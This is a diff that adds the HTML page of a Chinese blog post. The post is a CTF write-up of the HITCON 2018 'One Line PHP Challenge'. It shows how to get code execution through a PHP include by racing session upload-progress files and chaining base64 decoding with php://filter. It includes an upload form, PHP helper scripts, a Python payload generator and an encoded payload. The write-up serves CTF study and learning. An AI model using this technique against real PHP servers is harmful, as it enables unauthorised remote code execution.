@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          hitcon2018 One Line PHP Challenge - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/10/hitcon2018-One-Line-PHP-Challenge/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#writeup" title="writeup">writeup</a>
+                        
+                    </div>
+                    <h1>hitcon2018 One Line PHP Challenge</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-10-24
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>膜orange，质量相当高的题目。</p>
+<h1 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h1><p>题目相当简单，就一句话</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">($_=@$_GET[<span class="string">'orange'</span>]) &amp;&amp; @substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>) === <span class="string">'@&lt;?php'</span> ? <span class="keyword">include</span>($_) : highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>可以看到需要一个文件以<code>@&lt;?php</code>开头的文件，然后就可以进行文件包含。</p>
+<p>环境以及配置都是默认的<code>Ubuntu18.04+Apache2+PHP7.2</code></p>
+<p>不考虑0day的情况下。这里文件名是可以完全控制的，就需要想到各种协议流以及php的伪协议。</p>
+<p>这样，或许可以利用伪协议的方式来控制文件头。然后就是寻找我们可以控制的文件。</p>
+<p>php里默认可以由用户控制的文件就只有几个</p>
+<ul>
+<li>临时上传文件</li>
+<li>session文件</li>
+</ul>
+<p>临时上传文件由<code>/tmp/php[a-zA-z0-9]{6}</code>形式组成，在有phpinfo页面的时候可以进行文件包含</p>
+<p><a href="https://www.kingkk.com/2018/07/phpinfo-with-LFI/" target="_blank" rel="noopener">https://www.kingkk.com/2018/07/phpinfo-with-LFI/</a></p>
+<p>这里显然没有这个phpinfo页面，暴力破解的可能性约等于零。</p>
+<p>然后就是session文件，这里没有开启session，也没有可以控制的session字段。</p>
+<p>所以session文件也是无法控制的（对不起，是我不可以，但是orange可以</p>
+<h1 id="session-upload"><a href="#session-upload" class="headerlink" title="session.upload"></a>session.upload</h1><p>之前N1ctf的时候出现过的一个非预期解</p>
+<p><a href="https://xz.aliyun.com/t/2148#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148#toc-2</a></p>
+<p>在phpinfo中有几个配置</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hitcon2018-One-Line-PHP-Challenge/1.png" alt></p>
+<p>这个配置是在默认情况下开启的。</p>
+<p>他的出现本是为了显示文件在上传时候的进度，以显示文件上传的信息。</p>
+<p>这个信息是保存在用户的<code>$_SESSION</code>中的，而session则是以文件的形式保存在默认的路径下的。</p>
+<p>可以看到默认的文件路径是<code>/var/lib/php/sessions</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hitcon2018-One-Line-PHP-Challenge/2.png" alt></p>
+<p>这里有个小trick就是，这个session文件并不一定要<code>session_start</code>才能生成，只要往服务器发送一个<code>Cookie: PHPSESSID=xxx</code>的值，然后用session upload的方式进行上传文件，就会生成这样一个session文件</p>
+<p>由于文件上传的速度比较快，有时候经常来不及看到保存在session文件中的upload信息，就会被删除。我们可以上传一个相对比较大的文件，并且条件竞争的方式，来先看一下保存在session中的文件内容。</p>
+<p>这里构造了一个这样的表单，upload.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"upload.php"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line"> &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"&lt;?php echo ini_get("</span>session.upload_progress.name<span class="string">"); ?&gt;"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">"file"</span> name=<span class="string">"file1"</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">"file"</span> name=<span class="string">"file2"</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$name = ini_get(<span class="string">'session.upload_progress.name'</span>);</span><br><span class="line">$key = ini_get(<span class="string">'session.upload_progress.prefix'</span>) . $_POST[$name];</span><br><span class="line">var_dump($_SESSION[$key]); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'/var/lib/php/sessions/sess_kingkk'</span>;</span><br></pre></td></tr></table></figure>
+<p>加上任意的<code>PHPSESSID</code>，上传两个相对稍大的文件，这里http报文长度有61W</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hitcon2018-One-Line-PHP-Challenge/3.png" alt></p>
+<p>然后开个多线程跑几次，就能看到有些通过条件竞争，输出了还未被删除的<code>session</code>信息</p>
+<p><code>$_SERVER[ini_get(&#39;session.upload_progress.prefix&#39;) . $_POST[ini_get(&#39;session.upload_progress.name&#39;)]]</code>中保存了一些上传过程中的信息</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hitcon2018-One-Line-PHP-Challenge/4.png" alt></p>
+<p>以及session文件中的内容，可以看到就是反序列化的upload信息</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hitcon2018-One-Line-PHP-Challenge/5.png" alt></p>
+<p>对应目录下也确实生成了这个session文件，但是内容却是空的，因为文件上传完成后，会默认清除其中的内容。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hitcon2018-One-Line-PHP-Challenge/6.png" alt></p>
+<p>可以看到<code>sess_kingkk</code>中有不少值是可以通过改变传入的参数进行控制的，比如文件名、<code>PHP_SESSION_UPLOAD_PROGRESS</code>的值。从而只要插入对应的php代码，在存在文件包含的时候，就可以getshell</p>
+<p>这里修改了文件名为php代码，再利用一个文件包含的页面包含这个session文件</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hitcon2018-One-Line-PHP-Challenge/7.png" alt></p>
+<p>可以看到成功getshell</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hitcon2018-One-Line-PHP-Challenge/8.png" alt></p>
+<h1 id="重新认识base64"><a href="#重新认识base64" class="headerlink" title="重新认识base64"></a>重新认识base64</h1><p>接下来还有一个条件就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>) === <span class="string">'@&lt;?php'</span></span><br></pre></td></tr></table></figure>
+<p>但是观察之前的session信息，可以发现，文件是以<code>upload_progress_</code>开始，最多控制其后的<code>123</code>部分</p>
+<p>这时候能想到的就是利用php中的一些伪协议，进行文件内容的修改。这个思路p神的blog中也有写到过</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1</a></p>
+<p>就是利用<code>php://filter/write=convert.base64-decode/resource</code>的方式绕过死亡exit.</p>
+<p>这里需要一些base64的前置知识</p>
+<blockquote>
+<p>base64编码后的字符串集为[0-9a-zA-Z+/=]</p>
+<p>因而在解码的时候遇到这个之外的字符，就会跳过那些字符。只对在此范围内的字符进行解码。</p>
+</blockquote>
+<p>所以只要对前面的<code>upload_progress_</code>进行足够多次的解密，就可以使其变成空字符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$i = <span class="number">0</span> ;</span><br><span class="line">$data = <span class="string">"upload_progress_"</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">    $i += <span class="number">1</span>;</span><br><span class="line">    $data = base64_decode($data); </span><br><span class="line">    var_dump($data);</span><br><span class="line">    <span class="keyword">if</span>($data == <span class="string">''</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"一共解码了:"</span>.$i,<span class="string">"次\n"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hitcon2018-One-Line-PHP-Challenge/9.png" alt></p>
+<p>通过脚本可以看到，只要三次就可以将前面的内容转换为成空。</p>
+<p>可是事情似乎没有那么简单。由于base64是对四个字符为一组进行解码。<code>upload_progress_</code>并不满足三次解码后允许字符是4的倍数，就会把后面的字符算入填充，从而破坏原有传入的php代码</p>
+<p>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">triple_base64_encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> base64_encode(base64_encode(base64_encode($str)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">triple_base64_decode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> base64_decode(base64_decode(base64_decode($str)));</span><br><span class="line">&#125;</span><br><span class="line">$i = <span class="number">0</span> ;</span><br><span class="line">$data = <span class="string">"upload_progress_"</span>.triple_base64_encode(<span class="string">"&lt;?=\`id\`;&gt;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> triple_base64_decode($data);</span><br></pre></td></tr></table></figure>
+<p>解码之后的数据是<code>?</code></p>
+<p>然而解密<code>&quot;upload_progress_ZZ&quot;.triple_base64_encode(&quot;&lt;?=\</code>id`;&gt;”)<code>解码之后就是</code>&lt;?=`id`;&gt;`</p>
+<p>就是由于<code>upload_progress_ZZ</code>在三次的解码中，第一次解码后留下了四个允许字符<code>hikY</code>，第二次解码没有允许字符，第三次就变成了空。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hitcon2018-One-Line-PHP-Challenge/10.png" alt></p>
+<p>在这三次中，都是允许字符的数量都是4的倍数，这样就不会破坏后面传入的php代码。</p>
+<p>队友写的一个脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$str = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">	$i = <span class="number">0</span> ;</span><br><span class="line">	$data = <span class="string">"upload_progress_"</span>.substr(str_shuffle($str),<span class="number">10</span>,<span class="number">2</span>);</span><br><span class="line">	$s = base64_decode($data);</span><br><span class="line">	$s_length = strlen(preg_replace(<span class="string">'|[^a-z0-9A-Z+/]|s'</span>, <span class="string">''</span>, $s));</span><br><span class="line">	$ss = base64_decode($s);</span><br><span class="line">	$ss_length = strlen(preg_replace(<span class="string">'|[^a-z0-9A-Z+/]|s'</span>, <span class="string">''</span>, $ss));</span><br><span class="line">	$sss = base64_decode($ss);</span><br><span class="line">	<span class="keyword">if</span>($s_length%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; $ss_length%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; $sss==<span class="string">''</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> $data;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对于后面的php代码，也有一个要求，就是三次解密中都不能出现<code>=</code>，因为base64中<code>=</code>只能放在编码的最后补位，出现在中间的话，<code>php://filter/convert.base64-decode</code>流就无法正常解析，就会报错。</p>
+<p>对此oragne师傅写了个脚本生成这玩意</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'@&lt;?php echo `id`;?&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    junk = <span class="string">''</span>.join(sample(string.ascii_letters, randint(<span class="number">8</span>, <span class="number">16</span>)))</span><br><span class="line">    x = b64encode(payload + junk)</span><br><span class="line">    xx = b64encode(b64encode(payload + junk))</span><br><span class="line">    xxx = b64encode(b64encode(b64encode(payload + junk)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> x <span class="keyword">and</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> xx <span class="keyword">and</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> xxx:</span><br><span class="line">        <span class="keyword">print</span> xxx</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VV<span class="attr">VSM0</span>wyTkhhSGRKUjFacVlVYzRaMWxIYkd<span class="number">0</span>WlJITXZVRzVvZFdFeFZuUlZSVTVw</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hitcon2018-One-Line-PHP-Challenge/11.png" alt></p>
+<p>成功getshell</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hitcon2018-One-Line-PHP-Challenge/12.png" alt></p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>学到的东西相当多了。膜orange</p>
+<p>顺带说一句，貌似php中的<code>base64_decode</code>类似于网上的一些在线脚本之类的解密，会对数据进行一些优化，直观的感受就是，用解密一些省略了<code>=</code>的字符也可以顺利解密，然而用hackbar之类的工具就会直接返回空。</p>
+<p>php伪协议中的<code>php://filter/convert.base64-decode</code>类似于hackbar这种，对数据校验较为严格，所以有时候用php的<code>base_64decode</code>之后发现是可见字符，可实际包含的时候却会报错。</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://wonderkun.cc/index.html/?p=718" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=718</a></p>
+<p><a href="https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge" target="_blank" rel="noopener">https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/10/2018SECCON-ghostkingdom/" data-toggle="tooltip" data-placement="top" title="2018SECCON ghostkingdom">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/10/Thinkphp-聚合查询漏洞/" data-toggle="tooltip" data-placement="top" title="ThinkPHP 聚合查询漏洞">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#writeup" title="writeup">writeup</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
